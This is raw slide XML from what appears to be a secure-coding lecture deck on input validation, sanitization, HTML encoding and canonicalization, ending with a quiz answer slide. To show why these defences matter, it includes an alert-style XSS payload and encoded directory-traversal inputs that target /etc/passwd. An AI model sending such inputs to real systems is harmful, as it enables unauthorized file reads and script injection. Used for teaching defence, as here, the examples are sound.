              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It's not one single technique but a combination of strategies, often applied in this order:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Validation (The First Line of Defense)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An "Age" field must be a number between 0 and 120.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An email address must contain an @ symbol and a domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A username must only contain alphanumeric characters and underscores.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sanitization / Filtering (Cleaning the Input)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For HTML/XSS: Convert special characters into their HTML equivalents ("escaping").</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt; becomes &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lt;script&amp;gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;. When displayed in a browser, it will render as literal text, not execute as code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For SQL Injection: Use Parameterized Queries (also known as Prepared Statements).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>query = "SELECT * FROM users WHERE id = ?"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cursor.execute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(query, (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>,)) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="774357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60E26-6372-9EBE-8BAE-B693D74140A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>A Practical Example: Sanitizing a Username</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{976B302F-0442-858D-F5DF-C7E93971BBFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1056968"/>
            <a:ext cx="7704000" cy="3546982"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Let's say a user tries to register with this username:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>John&lt;script&gt;alert('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>')&lt;/script&gt;Doe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Step 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Your rule: "Usernames can only contain letters, numbers, and hyphens, and be 3-20 characters long."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>This input contains &lt; &gt; ( ) ' and is too long. Validation fails. You reject it and ask the user for a valid username.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Step 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: If Validation is More Permissive (e.g., allows any character)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>You would sanitize it by removing the dangerous tags: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>JohnDoe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Or, if you need to keep the symbols for display, you would escape it before saving to the database:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> 	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>John&amp;lt;script&amp;gt;alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>(&amp;#x27;xss&amp;#x27;)&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>script&amp;gt;Doe</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23417994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EE464-7A06-2888-5FF0-0A865C047657}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Encoding</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB03EAC7-518E-4437-46CE-C10401E8AD32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215750"/>
            <a:ext cx="7704000" cy="4054340"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Encoding is the process of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>converting data into a safe format by escaping special</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> characters so they are treated as data, not as executable code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Prevent the browser (or other interpreter) from misinterpreting data as code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is the most common context. You are putting untrusted data into the body of an HTML element.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Danger: &lt;script&gt;alert('XSS')&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Encoding: Convert HTML-specific characters to their HTML entities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt; becomes &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &gt; becomes &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        " becomes &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        ' becomes &amp;#x27; (or &amp;apos;)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &amp; becomes &amp;amp;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Output</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lt;script&amp;gt;alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(&amp;#x27;XSS&amp;#x27;)&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>script&amp;gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10036721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5B181-7A01-2C29-8B43-5B59E6CF69CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Canonicalization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC7B130D-F4C5-B1A2-3987-3C93F79C1364}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215750"/>
            <a:ext cx="7704000" cy="3665966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Canonicalization is the process of converting input data into a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>standard, simplest, and most consistent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> form before performing validation or processing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attackers often try to bypass security checks by encoding malicious input in different ways. If the application only validates input in one form but processes it in another, attackers can exploit this mismatch. Canonicalization ensures that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>all variations of input are reduced to one standard representation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> before validation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Suppose a web application blocks the string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to prevent directory traversal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>But attackers may encode it in different ways, such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>%2e%2e/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>..%2f</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>%2e%2e%5c (Windows style)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If validation only checks for ../, these encoded variations may slip through.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2718178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A49D8-EB0D-9E76-62BD-2E9F699EEB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8B8794-A444-B35A-2FE2-1046CCD14822}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Canonicalization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9FB4A6D-D73E-D3F1-F029-2197228FB986}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="963561"/>
            <a:ext cx="7789819" cy="4257368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example Attack:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Intended block: /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/passwd</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacker input: %2e%2e%2fetc%2fpasswd (URL encoded ../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/passwd)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If the application checks input before decoding, it won’t recognize this as malicious.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>After decoding (canonicalization), the string becomes ../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/passwd, and proper validation can block it. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Attacks:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Path Traversal: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacks can exploit variations in file paths to access unauthorized directories.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Encoding Issues: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Different encodings can be used to bypass security filters if not normalized.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Security Bypass: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Canonicalization flaws can allow access to restricted resources by manipulating input formats.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18057974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6337D-0A61-A0EE-4A3D-0D2C26898E07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="445025"/>
            <a:ext cx="8148367" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Attack Scenario Without Canonicalization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F9AE7CC-59FE-9CC3-AB5F-886C14D57AEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Imagine a web application that allows users to download files by specifying the file's name in a URL parameter:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>https://example.com/download?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file=report.pdf</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>An attacker might try to exploit the system by manipulating the file parameter to access files outside the intended directory. For example, they could input:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>https://example.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>download?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=../../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/passwd</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14956899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BB569-34FB-D21F-8372-6174FC699B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EAB60FC-CB70-E7B5-4E67-A2F0068A8B19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
